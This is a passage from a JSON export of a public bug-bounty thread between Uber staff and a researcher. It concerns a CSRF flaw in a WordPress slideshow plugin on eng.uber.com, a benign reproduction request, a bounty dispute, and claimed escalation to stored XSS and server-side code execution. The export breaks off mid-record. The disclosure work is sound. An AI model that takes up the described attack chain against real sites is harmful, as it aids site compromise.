{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-04-12T08:56:18.368Z", 
    "voters": [
        "japz", 
        "spetr0x", 
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 125594, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-04-26T16:08:57.449Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "CSRF on eng.uber.com may lead to server-side compromise", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-05-12T08:56:18.930Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-03-28T21:43:26.202Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-28T21:43:26.202Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey, as an update we're working on getting admin accounts for our Wordpress instances so we can validate this. Please be patient with us during this process :)", 
            "markdown_message": "<p>Hey, as an update we&#39;re working on getting admin accounts for our Wordpress instances so we can validate this. Please be patient with us during this process :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 875367, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-29T18:03:00.948Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T18:03:00.948Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko I just tried your proof of concept and I get a `0` as the response which I think indicates this didn't work based off of this statement:\n>A non-logged-in user receives just a \"0\".\n\nHere's the full request:\n```http\nPOST /wp-admin/admin-ajax.php?action=frs_show_modal HTTP/1.1\nHost: eng.uber.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: [REDACTED]\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11\n\npost_id=zzz\n```\n```http\nHTTP/1.1 200 OK\nServer: nginx\nVary: Accept-Encoding\nCache-Control: no-cache, must-revalidate, max-age=0\nContent-Type: text/html; charset=UTF-8\nDate: Tue, 29 Mar 2016 17:56:27 GMT\nKeep-Alive: timeout=20\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nPragma: no-cache\nX-Type: default\nX-Content-Type-Options: nosniff\nConnection: close\nX-Robots-Tag: noindex\nX-Frame-Options: SAMEORIGIN\nContent-Length: 1\n\n0\n```\n\nLet me know if I'm missing something here! Thanks :)", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a> I just tried your proof of concept and I get a <code>0</code> as the response which I think indicates this didn&#39;t work based off of this statement:</p>\n\n<blockquote>\n<p>A non-logged-in user receives just a &quot;0&quot;.</p>\n</blockquote>\n\n<p>Here&#39;s the full request:</p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/wp-admin/admin-ajax.php?action=frs_show_modal</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">eng.uber.com</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">Accept-Encoding</span><span class=\"p\">:</span> <span class=\"s\">gzip, deflate, br</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">[REDACTED]</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">application/x-www-form-urlencoded</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">11</span>\n\npost_id=zzz\n</code></pre><pre class=\"highlight http\"><code><span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span> <span class=\"m\">200</span> <span class=\"ne\">OK</span>\n<span class=\"na\">Server</span><span class=\"p\">:</span> <span class=\"s\">nginx</span>\n<span class=\"na\">Vary</span><span class=\"p\">:</span> <span class=\"s\">Accept-Encoding</span>\n<span class=\"na\">Cache-Control</span><span class=\"p\">:</span> <span class=\"s\">no-cache, must-revalidate, max-age=0</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">text/html; charset=UTF-8</span>\n<span class=\"na\">Date</span><span class=\"p\">:</span> <span class=\"s\">Tue, 29 Mar 2016 17:56:27 GMT</span>\n<span class=\"na\">Keep-Alive</span><span class=\"p\">:</span> <span class=\"s\">timeout=20</span>\n<span class=\"na\">Expires</span><span class=\"p\">:</span> <span class=\"s\">Wed, 11 Jan 1984 05:00:00 GMT</span>\n<span class=\"na\">Pragma</span><span class=\"p\">:</span> <span class=\"s\">no-cache</span>\n<span class=\"na\">X-Type</span><span class=\"p\">:</span> <span class=\"s\">default</span>\n<span class=\"na\">X-Content-Type-Options</span><span class=\"p\">:</span> <span class=\"s\">nosniff</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n<span class=\"na\">X-Robots-Tag</span><span class=\"p\">:</span> <span class=\"s\">noindex</span>\n<span class=\"na\">X-Frame-Options</span><span class=\"p\">:</span> <span class=\"s\">SAMEORIGIN</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">1</span>\n\n0\n</code></pre>\n<p>Let me know if I&#39;m missing something here! Thanks :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 876690, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-29T18:14:41.334Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T18:14:41.334Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "The plugin appears to have been disabled after I filed this report. Instead of the slideshow presentation there's just a static image now. If you view the source of the page in question, there are no references to Fluid Responsive Slideshow any more. Archive.org's version earlier in March has it. I confirmed the plugin was in use before submitting the report.\nhttp://web.archive.org/web/20160304012340/https://eng.uber.com/rescued-by-octopus/", 
            "markdown_message": "<p>The plugin appears to have been disabled after I filed this report. Instead of the slideshow presentation there&#39;s just a static image now. If you view the source of the page in question, there are no references to Fluid Responsive Slideshow any more. Archive.org&#39;s version earlier in March has it. I confirmed the plugin was in use before submitting the report.<br>\n<a title=\"http://web.archive.org/web/20160304012340/https://eng.uber.com/rescued-by-octopus/\" href=\"/redirect?signature=54a3b13f968091d39e4ac7d02a60d078f08b2655&amp;url=http%3A%2F%2Fweb.archive.org%2Fweb%2F20160304012340%2Fhttps%3A%2F%2Feng.uber.com%2Frescued-by-octopus%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://web.archive.org/web/20160304012340/https://eng.uber.com/rescued-by-octopus/</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 876705, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-29T18:27:26.021Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T18:27:26.021Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Ah shoot, the Wordpress admin for this site may have deleted it - looking into this now.", 
            "markdown_message": "<p>Ah shoot, the Wordpress admin for this site may have deleted it - looking into this now.</p>\n", 
            "type": "Activities::Comment", 
            "id": 876739, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "created_at": "2016-03-29T18:33:00.108Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T18:33:00.108Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Ah! I think it was removed because of this other bug you submitted: #125441. Since that is the case I'm going to close this as `Resolved`. It appears there is some debate on if we want to renable this plugin (because we want the functionality it provides) so this plugin may come back. \n\nMarking as `Resolved` for now, as an aside have you made the author aware of this vulnerability?", 
            "markdown_message": "<p>Ah! I think it was removed because of this other bug you submitted: <a href=\"/reports/125441\">#125441</a>. Since that is the case I&#39;m going to close this as <code>Resolved</code>. It appears there is some debate on if we want to renable this plugin (because we want the functionality it provides) so this plugin may come back. </p>\n\n<p>Marking as <code>Resolved</code> for now, as an aside have you made the author aware of this vulnerability?</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 876751, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-29T18:35:30.223Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-29T18:35:30.223Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Right. I haven't reported these to the author yet, will do it today.", 
            "markdown_message": "<p>Right. I haven&#39;t reported these to the author yet, will do it today.</p>\n", 
            "type": "Activities::Comment", 
            "id": 876757, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-12T00:46:35.451Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-12T00:46:35.451Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko! Thanks again for the report. Sorry about being a bit slow in responding, we've had a lot of reports to go through recently! Since the cause of and fix for this issue is the same as your other report #125441 the team has decided to consider them duplicates with regard to reward. We hope this is understandable. Good luck with future research!", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a>! Thanks again for the report. Sorry about being a bit slow in responding, we&#39;ve had a lot of reports to go through recently! Since the cause of and fix for this issue is the same as your other report <a href=\"/reports/125441\">#125441</a> the team has decided to consider them duplicates with regard to reward. We hope this is understandable. Good luck with future research!</p>\n", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 900588, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-12T08:56:00.381Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-12T08:56:00.381Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Bugs #125441 and this one are completely separate bugs with different causes, and XSS and a CSRF. Their impacts are also very different - this CSRF allows the attacker to fully control the content on the site to cause \"brand damage\". It's also possible to store any HTML and JavaScript and thus target all users who view the site. As I also demonstrated, this leads to RCE if a site administrator is targeted.\n\nThe only thing in common is that the bugs happen in the same WordPress plugin. The fix is the same because you've chosen to remove the software package altogether. With the same logic, shutting down an entire site with several bugs would combine the cause and fix of all bugs there and you could reward only one bug with the lowest impact.", 
            "markdown_message": "<p>Bugs <a href=\"/reports/125441\">#125441</a> and this one are completely separate bugs with different causes, and XSS and a CSRF. Their impacts are also very different - this CSRF allows the attacker to fully control the content on the site to cause &quot;brand damage&quot;. It&#39;s also possible to store any HTML and JavaScript and thus target all users who view the site. As I also demonstrated, this leads to RCE if a site administrator is targeted.</p>\n\n<p>The only thing in common is that the bugs happen in the same WordPress plugin. The fix is the same because you&#39;ve chosen to remove the software package altogether. With the same logic, shutting down an entire site with several bugs would combine the cause and fix of all bugs there and you could reward only one bug with the lowest impact.</p>\n", 
            "type": "Activities::Comment", 
            "id": 901003, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-12T08:56:18.401Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-12T08:56:18.401Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 901004, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T16:08:48.320Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T16:08:48.320Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko, to clarify on this:\n\n>With the same logic, shutting down an entire site with several bugs would combine the cause and fix of all bugs there and you could reward only one bug with the lowest impact.\n\nWe did not reward the bug with the lowest impact, we rewarded the bug which had the highest impact. The flip side of this is that we could have one plugin with 20 different Cross-site Scripting (XSS) and Cross-site Request Forgery (CSRF) vulnerabilities. Paying out all of these separately would be unrealistic because the fix is the same for all of them - remove the bad plugin. For this reason paying out separately for each bug when the fix is the same can be dangerous and we usually lump the payments together (often bumping it up, as we did in your case).\n\n>As I also demonstrated, this leads to RCE if a site administrator is targeted.\n\nRemote code execution is only possible (as far as I'm aware) if the Wordpress administrator can edit plugins for the blog. This was not possible on eng.uber.com (I just checked by logging in as an admin) so I don't think RCE was possible. Let me know if I'm missing something on this.\n\nApologies for the confusion, we hope you will continue with our program. Either way we wish you luck in your future hacking and appreciate your well written report!", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a>, to clarify on this:</p>\n\n<blockquote>\n<p>With the same logic, shutting down an entire site with several bugs would combine the cause and fix of all bugs there and you could reward only one bug with the lowest impact.</p>\n</blockquote>\n\n<p>We did not reward the bug with the lowest impact, we rewarded the bug which had the highest impact. The flip side of this is that we could have one plugin with 20 different Cross-site Scripting (XSS) and Cross-site Request Forgery (CSRF) vulnerabilities. Paying out all of these separately would be unrealistic because the fix is the same for all of them - remove the bad plugin. For this reason paying out separately for each bug when the fix is the same can be dangerous and we usually lump the payments together (often bumping it up, as we did in your case).</p>\n\n<blockquote>\n<p>As I also demonstrated, this leads to RCE if a site administrator is targeted.</p>\n</blockquote>\n\n<p>Remote code execution is only possible (as far as I&#39;m aware) if the Wordpress administrator can edit plugins for the blog. This was not possible on eng.uber.com (I just checked by logging in as an admin) so I don&#39;t think RCE was possible. Let me know if I&#39;m missing something on this.</p>\n\n<p>Apologies for the confusion, we hope you will continue with our program. Either way we wish you luck in your future hacking and appreciate your well written report!</p>\n", 
            "type": "Activities::Comment", 
            "id": 928839, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T16:08:57.485Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T16:08:57.485Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 928840, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T16:08:57.552Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T16:08:57.552Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 928841, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T16:09:24.240Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T16:09:24.240Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Also, publicly disclosed per your request. Thanks!", 
            "markdown_message": "<p>Also, publicly disclosed per your request. Thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 928842, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T17:11:35.434Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T17:11:35.434Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "But on April 12 at #125441 (same plugin XSS) you explained you're \"paying out the maximum amount we would consider for a reflected XSS because our policy previously didn't make it clear the the stated amounts were maximums.\" Now you say the bounty was **not** for XSS, but this CSRF after all. Which of these conflicting explanations is true?\n\nThe fact that you \"just checked\" the RCE, weeks after the bounty was issued, also raises a question or two. This makes it clear the bug was just lumped together with the XSS and the bounty was decided without knowing the impact. How could the test you just made today explain the low bounty you issued weeks ago?\n\nWriting to the plugin directory is just one possible way to achieve code execution. If you had assessed the bug impact and told me it's lower than I reported, I could have tried giving other alternatives.", 
            "markdown_message": "<p>But on April 12 at <a href=\"/reports/125441\">#125441</a> (same plugin XSS) you explained you&#39;re &quot;paying out the maximum amount we would consider for a reflected XSS because our policy previously didn&#39;t make it clear the the stated amounts were maximums.&quot; Now you say the bounty was <strong>not</strong> for XSS, but this CSRF after all. Which of these conflicting explanations is true?</p>\n\n<p>The fact that you &quot;just checked&quot; the RCE, weeks after the bounty was issued, also raises a question or two. This makes it clear the bug was just lumped together with the XSS and the bounty was decided without knowing the impact. How could the test you just made today explain the low bounty you issued weeks ago?</p>\n\n<p>Writing to the plugin directory is just one possible way to achieve code execution. If you had assessed the bug impact and told me it&#39;s lower than I reported, I could have tried giving other alternatives.</p>\n", 
            "type": "Activities::Comment", 
            "id": 928954, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T21:01:07.414Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T21:01:07.414Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": ">Now you say the bounty was not for XSS, but this CSRF after all. Which of these conflicting explanations is true?\n\nI'm not sure I understand, where did I say that it was for CSRF? Perhaps I misspoke?\n\n>This makes it clear the bug was just lumped together with the XSS and the bounty was decided without knowing the impact.\n\nIIRC we did check the impact when we awarded the previous bounty. I was just verifying that our previous assessment was indeed valid (because if it was actually RCE then the bounty might've been inaccurate which is why I checked).\n\n>Writing to the plugin directory is just one possible way to achieve code execution. If you had assessed the bug impact and told me it's lower than I reported, I could have tried giving other alternatives.\n\nCould you state some possible alternatives? I suppose I've just not heard of another way to achieve RCE when plugin editing is disabled in Wordpress. As stated before this could've been an incorrect assumption - which we'd be open to hearing more about.", 
            "markdown_message": "<blockquote>\n<p>Now you say the bounty was not for XSS, but this CSRF after all. Which of these conflicting explanations is true?</p>\n</blockquote>\n\n<p>I&#39;m not sure I understand, where did I say that it was for CSRF? Perhaps I misspoke?</p>\n\n<blockquote>\n<p>This makes it clear the bug was just lumped together with the XSS and the bounty was decided without knowing the impact.</p>\n</blockquote>\n\n<p>IIRC we did check the impact when we awarded the previous bounty. I was just verifying that our previous assessment was indeed valid (because if it was actually RCE then the bounty might&#39;ve been inaccurate which is why I checked).</p>\n\n<blockquote>\n<p>Writing to the plugin directory is just one possible way to achieve code execution. If you had assessed the bug impact and told me it&#39;s lower than I reported, I could have tried giving other alternatives.</p>\n</blockquote>\n\n<p>Could you state some possible alternatives? I suppose I&#39;ve just not heard of another way to achieve RCE when plugin editing is disabled in Wordpress. As stated before this could&#39;ve been an incorrect assumption - which we&#39;d be open to hearing more about.</p>\n", 
            "type": "Activities::Comment", 
            "id": 929190, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-26T23:04:16.879Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-26T23:04:16.879Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "It's certainly a bit confusing. You explained that the #125441 bounty was the maximum you'd consider for a reflected XSS ($3k) because the policy didn't make it clear that the stated sums were maximums. That bounty was consistent with the original policy and your other bounties for reflected XSS's. This CSRF wasn't mentioned in that context.  I think I understood until that point.\n\nNow for CSRF+stored XSS (+RCE?) the logic no longer applies and the bounty is *not* the maximum for the bug type. Even without RCE the bug would seem to fit the description of \"significant issues\" ($5k) quite spot-on. Instead, there was no bounty at all in addition to the separate reflected XSS bug.\n\nHow CSRF+stored XSS (+RCE?) PLUS an unspecified bump-up bonus, PLUS a separate reflected XSS worth $3k still equals $3k remains elusive.\n\nIf there was a problem with my report and the impact wasn't what I stated, and *that's* why the second bug was worth nothing... then why didn't I hear about it until 15 days after the report was closed and the bounty issued? Disabling plugin editing most definitely doesn't prevent RCE if you can run JS with WP administrator privileges.\n", 
            "markdown_message": "<p>It&#39;s certainly a bit confusing. You explained that the <a href=\"/reports/125441\">#125441</a> bounty was the maximum you&#39;d consider for a reflected XSS ($3k) because the policy didn&#39;t make it clear that the stated sums were maximums. That bounty was consistent with the original policy and your other bounties for reflected XSS&#39;s. This CSRF wasn&#39;t mentioned in that context.  I think I understood until that point.</p>\n\n<p>Now for CSRF+stored XSS (+RCE?) the logic no longer applies and the bounty is <em>not</em> the maximum for the bug type. Even without RCE the bug would seem to fit the description of &quot;significant issues&quot; ($5k) quite spot-on. Instead, there was no bounty at all in addition to the separate reflected XSS bug.</p>\n\n<p>How CSRF+stored XSS (+RCE?) PLUS an unspecified bump-up bonus, PLUS a separate reflected XSS worth $3k still equals $3k remains elusive.</p>\n\n<p>If there was a problem with my report and the impact wasn&#39;t what I stated, and <em>that&#39;s</em> why the second bug was worth nothing... then why didn&#39;t I hear about it until 15 days after the report was closed and the bounty issued? Disabling plugin editing most definitely doesn&#39;t prevent RCE if you can run JS with WP administrator privileges.</p>\n", 
            "type": "Activities::Comment", 
            "id": 929397, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-27T01:49:58.482Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-27T01:49:58.482Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "One way to escalate admin XSS to server-side execution seems to be via the \"wpengine-common\" plugin (I'm pretty sure there are other ways too). The details haven't probably been publicly discussed before and since it might have some implications, I'm not sure this is the right place to do it? I think it works on your other WP sites as well, so if there was a similar assumption behind the other bounties, maybe you can reconsider them too. I'll file a separate bug report about it.", 
            "markdown_message": "<p>One way to escalate admin XSS to server-side execution seems to be via the &quot;wpengine-common&quot; plugin (I&#39;m pretty sure there are other ways too). The details haven&#39;t probably been publicly discussed before and since it might have some implications, I&#39;m not sure this is the right place to do it? I think it works on your other WP sites as well, so if there was a similar assumption behind the other bounties, maybe you can reconsider them too. I&#39;ll file a separate bug report about it.</p>\n", 
            "type": "Activities::Comment", 
            "id": 929613, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-27T02:21:41.015Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-27T02:22:08.925Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "bug #134907", 
            "markdown_message": "<p>bug <a href=\"/reports/134907\">#134907</a></p>\n", 
            "type": "Activities::Comment", 
            "id": 929635, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-27T18:10:20.243Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-27T18:10:20.243Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
